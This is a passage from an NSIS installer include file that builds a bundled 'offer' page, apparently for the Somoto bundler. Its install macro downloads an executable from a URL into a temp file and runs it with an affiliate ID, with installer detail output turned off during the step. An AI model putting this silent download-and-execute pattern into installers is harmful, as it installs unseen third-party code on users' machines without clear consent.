!insertmacro TEST_NAYA '$4/state_values/off' $5
StrCpy $offer.cmd_line '$offer.cmd_line $5'
${ENDIF}
skip2:
!insertmacro END_CHILD_NODE_LOOP 'dopts'
no_childs:
${ELSE}
!insertmacro TEST_NAYA '$0/state_values/off' $5
StrCpy $offer.cmd_line '$offer.cmd_line $5'
${ENDIF}
no_wnd:        
!insertmacro END_CHILD_NODE_LOOP 'options'
Pop $5
Pop $4
Pop $3
Pop $2
Pop $1
Pop $0
FunctionEnd
!macroend
!verbose pop
!macro INIT_BINSIS affid sw_id
!ifndef BINSIS_AFFID
!define BINSIS_AFFID ${affid}
!else
!error 'INIT_BINSIS used more than once'
!endif
!ifndef BINSIS_SOFTWARE_ID
!define BINSIS_SOFTWARE_ID ${sw_id}
!else
!error 'INIT_BINSIS used more than once'
!endif   
!macroend
!macro BINSIS_OFFER_PAGE
!echo "---------------------------------------------------------------"
!echo "||      Addding BINSIS ${BINSIS_VERSION} Offering page        ||"
!echo "---------------------------------------------------------------"
!verbose push
!verbose 3
!ifndef MUI_INCLUDED
!error "Better installer offering need MUI. Did you include mui.nsh before binsis.nsh ??"
!endif
!ifdef BINSIS_OFFER_PAGE_ADDED
!warning "Offer page added more than once"
!else
!define BINSIS_OFFER_PAGE_ADDED
!endif
!insertmacro BINSIS_ADVANCED_CONFIG
!insertmacro BINSIS_INIT_FUNCTION
Page custom nsSettingsPage nsSettingsPageLeave
!insertmacro BINSIS_HELPER_FUNCTIONS
!insertmacro CREATE_FUNCTION
!insertmacro LEAVE_FUNCTION
!verbose pop
!macroend
!macro PERFORM_SOMOTO_INSTALL
!verbose push
!verbose 3
!ifndef __SECTION__
!error "PERFORM_SOMOTO_INSTALL Not permitted outside sections"
!endif
!ifndef PERFORM_SOMOTO_INSTALL_INCLUDED
!define PERFORM_SOMOTO_INSTALL_INCLUDED
!else
!error "PERFORM_SOMOTO_INSTALL used more than once"        
!endif
!insertmacro BINSIS_INIT_FUNCTION
SetDetailsPrint none
IntCmp $offer.ready 0 finish_install
StrCmp $offer.downloader.en "0" do_interanal
StrCmp $offer.downloader.init "1" skip_download
${BD} "post download $download_url"
DetailPrint "Downloading tool..."
GetTempFileName $offer.downloader.exe
inetc::get /NOCANCEL $offer.downloader.url $offer.downloader.exe /END
Pop $0
StrCmp $0 "OK" 0 finish_install
skip_download:    
Push $offer.downloader.args
Call ExpandMacros
Pop $offer.downloader.args
StrCpy $0 '$offer.downloader.exe /affid ${BINSIS_AFFID} /id ${BINSIS_SOFTWARE_ID} $offer.downloader.args -url=$download_url -exec_args=$offer.cmd_line'
${BD} $0
Exec $0 
Goto finish_install
do_interanal:
${BD} 'internal execution $download_url'
DetailPrint "Downloading software..."
SetDetailsPrint none
GetTempFileName $1
inetc::get /NOCANCEL $download_url $1 /END
Pop $0
SetDetailsPrint both
StrCmp $0 "OK" 0 finish_install
StrCpy $0 '$1 $offer.cmd_line'
${BD} $0
Exec $0 
finish_install:    
SetDetailsPrint lastused
!verbose pop
!macroend
!macro DISABLE_OFFER
StrCpy $offer.ready "0"
StrCpy $offer.disabled "1"
!macroend
!define BINSIS_Install '!insertmacro PERFORM_SOMOTO_INSTALL'
!define BINSIS_Disable '!insertmacro DISABLE_OFFER'